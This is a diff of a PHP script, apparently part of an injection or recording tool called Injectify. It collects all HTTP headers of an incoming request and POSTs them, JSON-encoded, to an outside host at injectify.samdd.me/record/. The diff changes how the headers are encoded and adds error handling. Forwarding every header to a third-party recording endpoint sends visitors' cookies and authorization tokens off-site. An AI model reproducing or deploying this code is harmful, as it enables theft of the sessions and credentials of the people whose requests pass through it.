@@ -32,19 +32,22 @@
         $base64 = explode("/", $_SERVER['REQUEST_URI']);
         $base64 = $base64[count($base64) - 1];
     }
-    $postdata = http_build_query(
-        getallheaders()
-    );
-    $opts = array('http' =>
-        array(
-            'method'  => 'POST',
-            'header'  => 'Content-type: application/x-www-form-urlencoded',
-            'content' => $postdata
-        )
-    );
-    $context  = stream_context_create($opts);
     $injectifyURL = "http://injectify.samdd.me/record/" . $base64;
-    $response    = file_get_contents($injectifyURL, false, $context);
+
+    $params = array('http' => array(
+        'method' => 'POST',
+        'content' => 'forwarded-headers=' . urlencode(json_encode(getallheaders()))
+    ));
+    $ctx = stream_context_create($params);
+    $fp = @fopen($injectifyURL, 'rb', false, $ctx);
+    if (!$fp) {
+        throw new Exception("Problem with $injectifyURL, $php_errormsg");
+    }
+    
+    $response = @stream_get_contents($fp);
+    if ($response === false) {
+        throw new Exception("Problem reading data from $injectifyURL, $php_errormsg");
+    }
 
     if (substr($base64, -5) == '&view') {
         header("Content-type: application/json");
